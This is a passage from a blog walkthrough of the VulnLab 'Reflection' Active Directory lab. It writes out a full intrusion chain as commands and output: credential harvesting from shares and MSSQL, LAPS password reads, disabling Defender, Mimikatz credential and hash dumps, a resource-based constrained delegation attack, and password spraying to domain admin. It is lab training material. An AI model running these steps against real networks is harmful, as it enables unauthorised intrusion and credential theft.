+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient.py reflection/svc_web_staging@dc01.reflection.vl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Accessing-the-Production-Share"><a href="#Accessing-the-Production-Share" class="headerlink" title="Accessing the Production Share"></a>Accessing the Production Share</h3><p>On the <strong>prod</strong> share, we discovered another configuration file with credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user=web_prod</span><br><span class="line">password=&lt;PASS&gt;</span><br><span class="line">db=prod</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Escalating-Privileges"><a href="#Escalating-Privileges" class="headerlink" title="Escalating Privileges"></a>Escalating Privileges</h2><h3 id="Enumerating-the-Production-Database"><a href="#Enumerating-the-Production-Database" class="headerlink" title="Enumerating the Production Database"></a>Enumerating the Production Database</h3><p>We connected to the production database and found user credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py ./web_prod:&lt;PASS&gt;@dc01.reflection.vl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SQL (web_prod  guest@master)&gt; use prod</span><br><span class="line">ENVCHANGE(DATABASE): Old Value: master, New Value: prod</span><br><span class="line">INFO(DC01\SQLEXPRESS): Line 1: Changed database context to &#x27;prod&#x27;.</span><br><span class="line">SQL (web_prod  dbo@prod)&gt; select * from users;</span><br><span class="line">id   name              password            </span><br><span class="line">--   ---------------   -----------------   </span><br><span class="line"> 1   b&#x27;abbie.smith&#x27;    b&#x27;&lt;PASS&gt;&#x27;   </span><br><span class="line"> 2   b&#x27;dorothy.rose&#x27;   b&#x27;&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BloodHound-Enumeration"><a href="#BloodHound-Enumeration" class="headerlink" title="BloodHound Enumeration"></a>BloodHound Enumeration</h3><p>We collected BloodHound data to map out the domain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.reflection.vl -u abbie.smith -p &#x27;&lt;PASS&gt;&#x27; --bloodhound --dns-server 10.10.243.229 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Reflection/bloodhound-perms.png" alt="BloodHound Permissions"></p>
+<p>The analysis revealed that <strong>abbie.smith</strong> had permissions to read <strong>LAPS passwords</strong>.</p>
+<hr>
+<h2 id="LAPS-Exploitation"><a href="#LAPS-Exploitation" class="headerlink" title="LAPS Exploitation"></a>LAPS Exploitation</h2><h3 id="Reading-LAPS-Password"><a href="#Reading-LAPS-Password" class="headerlink" title="Reading LAPS Password"></a>Reading LAPS Password</h3><p>We extracted the LAPS password for MS01:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.10.243.229 -d &#x27;reflection.vl&#x27; -u &#x27;abbie.smith&#x27; -p &#x27;PASSWORD&#x27; get search --filter &#x27;(ms-mcs-admpwdexpirationtime=*)&#x27; --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">distinguishedName: CN=MS01,OU=servers,DC=reflection,DC=vl</span><br><span class="line">ms-Mcs-AdmPwd: &lt;PASS&gt;</span><br><span class="line">ms-Mcs-AdmPwdExpirationTime: 135379607820000000</span><br></pre></td></tr></table></figure>
+
+<h3 id="Gaining-Administrator-Access-on-MS01"><a href="#Gaining-Administrator-Access-on-MS01" class="headerlink" title="Gaining Administrator Access on MS01"></a>Gaining Administrator Access on MS01</h3><p>With the local administrator password, we achieved full access:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb ms01.reflection.vl -u &#x27;administrator&#x27; -p &#x27;&lt;PASS&gt;&#x27; -d .</span><br></pre></td></tr></table></figure>
+
+<p>We connected via WinRM:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i ms01.reflection.vl -u &#x27;administrator&#x27; -p &#x27;&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Reflection/lab_admin_user.png" alt="Lab Admin User Discovery"></p>
+<p>We discovered a home folder for the user <strong>labadm</strong>, who was in the <strong>ADMINISTRATORS</strong> group.</p>
+<hr>
+<h2 id="Credential-Extraction-with-Mimikatz"><a href="#Credential-Extraction-with-Mimikatz" class="headerlink" title="Credential Extraction with Mimikatz"></a>Credential Extraction with Mimikatz</h2><h3 id="Disabling-Windows-Defender"><a href="#Disabling-Windows-Defender" class="headerlink" title="Disabling Windows Defender"></a>Disabling Windows Defender</h3><p>We disabled real-time protection and uploaded Mimikatz (using Sliver C2 framework):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MpPreference -DisableRealtimeMonitoring $true</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dumping-Logon-Passwords"><a href="#Dumping-Logon-Passwords" class="headerlink" title="Dumping Logon Passwords"></a>Dumping Logon Passwords</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &#x27;&quot;token::elevate&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>This revealed the password for the domain service account:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kerberos :	</span><br><span class="line"> * Username : svc_web_staging</span><br><span class="line"> * Domain   : REFLECTION.VL</span><br><span class="line"> * Password : &lt;PASS&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dumping-Cached-Credentials"><a href="#Dumping-Cached-Credentials" class="headerlink" title="Dumping Cached Credentials"></a>Dumping Cached Credentials</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &#x27;&quot;token::elevate&quot; &quot;privilege::debug&quot; &quot;lsadump::cache&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[NL$1 - 6/7/2023 11:08:01 AM]</span><br><span class="line">RID       : 0000045f (1119)</span><br><span class="line">User      : REFLECTION\svc_web_staging</span><br><span class="line">MsCacheV2 : 6123c7b97697564e016b797de99025dd</span><br><span class="line"></span><br><span class="line">[NL$2 - 6/7/2023 11:11:08 AM]</span><br><span class="line">RID       : 000001f4 (500)</span><br><span class="line">User      : REFLECTION\Administrator</span><br><span class="line">MsCacheV2 : 10c8403d0d68c47754170bf825ffbe9d</span><br><span class="line"></span><br><span class="line">[NL$3 - 11/8/2025 3:04:31 AM]</span><br><span class="line">RID       : 00000454 (1108)</span><br><span class="line">User      : REFLECTION\Georgia.Price</span><br><span class="line">MsCacheV2 : f20a83b9452ce1c17cf4a57c2b05f7ec</span><br></pre></td></tr></table></figure>
+
+<p>Notably, we found cached credentials for <strong>Georgia.Price</strong>, who had <strong>GenericAll</strong> rights over <strong>WS01</strong>.</p>
+<p><img src="/images/Reflection/ws-01-genericall.png" alt="GenericAll Over WS01"></p>
+<h3 id="Dumping-Credential-Manager"><a href="#Dumping-Credential-Manager" class="headerlink" title="Dumping Credential Manager"></a>Dumping Credential Manager</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &#x27;&quot;token::elevate&quot; &quot;privilege::debug&quot; &quot;vault::cred /patch&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TargetName : Domain:batch=TaskScheduler:Task:&#123;013CD3ED-72CB-4801-99D7-8E7CA1F7E370&#125; / &lt;NULL&gt;</span><br><span class="line">UserName   : REFLECTION\Georgia.Price</span><br><span class="line">Comment    : &lt;NULL&gt;</span><br><span class="line">Type       : 2 - domain_password</span><br><span class="line">Persist    : 2 - local_machine</span><br><span class="line">Flags      : 00004004</span><br><span class="line">Credential : &lt;PASS&gt;</span><br><span class="line">Attributes : 0</span><br></pre></td></tr></table></figure>
+
+<p>We successfully extracted <strong>Georgia.Price’s</strong> plaintext password from the Windows Credential Manager.</p>
+<hr>
+<h2 id="Resource-Based-Constrained-Delegation-RBCD-Attack"><a href="#Resource-Based-Constrained-Delegation-RBCD-Attack" class="headerlink" title="Resource-Based Constrained Delegation (RBCD) Attack"></a>Resource-Based Constrained Delegation (RBCD) Attack</h2><p>Since we couldn’t add new machine accounts to the domain, we leveraged the compromised <strong>MS01</strong> machine account to perform an RBCD attack against <strong>WS01</strong>.</p>
+<h3 id="Configuring-RBCD"><a href="#Configuring-RBCD" class="headerlink" title="Configuring RBCD"></a>Configuring RBCD</h3><p>We modified WS01’s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbcd.py -action write -delegate-to &quot;WS01$&quot; -delegate-from &quot;MS01$&quot; -dc-ip 10.10.243.229 &quot;Reflection/Georgia.Price:&lt;PASS&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Requesting-a-Service-Ticket"><a href="#Requesting-a-Service-Ticket" class="headerlink" title="Requesting a Service Ticket"></a>Requesting a Service Ticket</h3><p>We impersonated the Administrator and requested a service ticket for CIFS:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn &#x27;cifs/WS01.reflection.vl&#x27; -impersonate Administrator -dc-ip 10.10.243.229 &#x27;Reflection/MS01$&#x27; -hashes &#x27;:&lt;HASH&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dumping-Secrets"><a href="#Dumping-Secrets" class="headerlink" title="Dumping Secrets"></a>Dumping Secrets</h3><p>We used the service ticket to dump credentials from WS01:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_WS01.reflection.vl@REFLECTION.VL.ccache</span><br><span class="line">secretsdump.py -k -no-pass Administrator@ws01.reflection.vl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Reflection/password-found.png" alt="Password Discovered"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reflection.vl\Rhys.Garner:&lt;PASS&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Domain-Compromise-Password-Spraying"><a href="#Domain-Compromise-Password-Spraying" class="headerlink" title="Domain Compromise - Password Spraying"></a>Domain Compromise - Password Spraying</h2><p>With the password for <strong>Rhys.Garner</strong>, we performed password spraying across domain accounts:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb dc01.reflection.vl -u usernames.txt -p &#x27;&lt;PASS&gt;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<p><strong>Success!</strong> The user <strong>dom_rgarner</strong>, a domain administrator, reused the same password:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.243.229   445    DC01             [+] reflection.vl\dom_rgarner:&lt;PASS&gt; (Pwn3d!)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h2><p>The flags are located in the following directories:</p>
+<ul>
+<li><strong>WS01</strong>: Local Administrator’s Desktop</li>
+<li><strong>MS01</strong>: Local Administrator’s Desktop  </li>
+<li><strong>DC01</strong>: Domain Administrator’s Desktop</li>
+</ul>
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The <strong>Reflection Chain</strong> from VulnLab is an excellent Pro Lab that covers multiple advanced Active Directory attack vectors. This walkthrough demonstrated:</p>
+<ul>
+<li>SMB enumeration and guest access exploitation</li>
+<li>MSSQL exploitation using <code>xp_dirtree</code></li>
+<li>NTLM relay attacks with SOCKS proxying</li>
+<li>LAPS password extraction</li>
+<li>Credential dumping with Mimikatz</li>
+<li>Resource-Based Constrained Delegation (RBCD)</li>
+<li>Password spraying leading to domain compromise</li>
+</ul>
+<p>This lab is highly recommended for penetration testers looking to sharpen their skills in realistic Active Directory environments, similar to those found in <strong>Hack The Box</strong> Pro Labs.</p>
+<p><strong>Lab Share Link</strong>: <a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=1031468a-6797-4d4e-aef5-63f3fc2cf123">https://api.vulnlab.com/api/v1/share?id=1031468a-6797-4d4e-aef5-63f3fc2cf123</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reflection-Chain-VulnLab-Hack-The-Box-Lab-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Reflection Chain - VulnLab &#x2F; Hack The Box Lab Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Overview"><span class="toc-number">1.1.</span> <span class="toc-text">Network Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-dc01-reflection-vl"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan - dc01.reflection.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-ws01-reflection-vl"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - ws01.reflection.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-ms01-reflection-vl"><span class="toc-number">1.2.3.</span> <span class="toc-text">Nmap Scan - ms01.reflection.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-SMB-Guest-Access"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access - SMB Guest Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Discovering-the-Staging-Share"><span class="toc-number">1.3.1.</span> <span class="toc-text">Discovering the Staging Share</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">MSSQL Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Authenticating-to-MSSQL"><span class="toc-number">1.4.1.</span> <span class="toc-text">Authenticating to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-the-Database"><span class="toc-number">1.4.2.</span> <span class="toc-text">Connecting to the Database</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Relay-Attack"><span class="toc-number">1.5.</span> <span class="toc-text">NTLM Relay Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Capturing-Net-NTLMv2-Hashes"><span class="toc-number">1.5.1.</span> <span class="toc-text">Capturing Net-NTLMv2 Hashes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-NTLM-Relay"><span class="toc-number">1.5.2.</span> <span class="toc-text">Setting Up NTLM Relay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Relaying-to-MSSQL-on-DC01"><span class="toc-number">1.5.3.</span> <span class="toc-text">Relaying to MSSQL on DC01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOCKS-Proxy-for-SMB-Access"><span class="toc-number">1.5.4.</span> <span class="toc-text">SOCKS Proxy for SMB Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-the-Production-Share"><span class="toc-number">1.5.5.</span> <span class="toc-text">Accessing the Production Share</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Escalating-Privileges"><span class="toc-number">1.6.</span> <span class="toc-text">Escalating Privileges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-the-Production-Database"><span class="toc-number">1.6.1.</span> <span class="toc-text">Enumerating the Production Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.6.2.</span> <span class="toc-text">BloodHound Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LAPS-Exploitation"><span class="toc-number">1.7.</span> <span class="toc-text">LAPS Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-LAPS-Password"><span class="toc-number">1.7.1.</span> <span class="toc-text">Reading LAPS Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gaining-Administrator-Access-on-MS01"><span class="toc-number">1.7.2.</span> <span class="toc-text">Gaining Administrator Access on MS01</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Extraction-with-Mimikatz"><span class="toc-number">1.8.</span> <span class="toc-text">Credential Extraction with Mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Disabling-Windows-Defender"><span class="toc-number">1.8.1.</span> <span class="toc-text">Disabling Windows Defender</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-Logon-Passwords"><span class="toc-number">1.8.2.</span> <span class="toc-text">Dumping Logon Passwords</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-Cached-Credentials"><span class="toc-number">1.8.3.</span> <span class="toc-text">Dumping Cached Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-Credential-Manager"><span class="toc-number">1.8.4.</span> <span class="toc-text">Dumping Credential Manager</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resource-Based-Constrained-Delegation-RBCD-Attack"><span class="toc-number">1.9.</span> <span class="toc-text">Resource-Based Constrained Delegation (RBCD) Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-RBCD"><span class="toc-number">1.9.1.</span> <span class="toc-text">Configuring RBCD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Requesting-a-Service-Ticket"><span class="toc-number">1.9.2.</span> <span class="toc-text">Requesting a Service Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-Secrets"><span class="toc-number">1.9.3.</span> <span class="toc-text">Dumping Secrets</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Compromise-Password-Spraying"><span class="toc-number">1.10.</span> <span class="toc-text">Domain Compromise - Password Spraying</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flags"><span class="toc-number">1.11.</span> <span class="toc-text">Flags</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.12.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/08/VL-Reflection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&text=VL-Reflection"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&is_video=false&description=VL-Reflection"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Reflection&body=Check out this article: https://panosoikogr.github.io/2025/11/08/VL-Reflection/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&title=VL-Reflection"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&name=VL-Reflection&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/08/VL-Reflection/&t=VL-Reflection"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
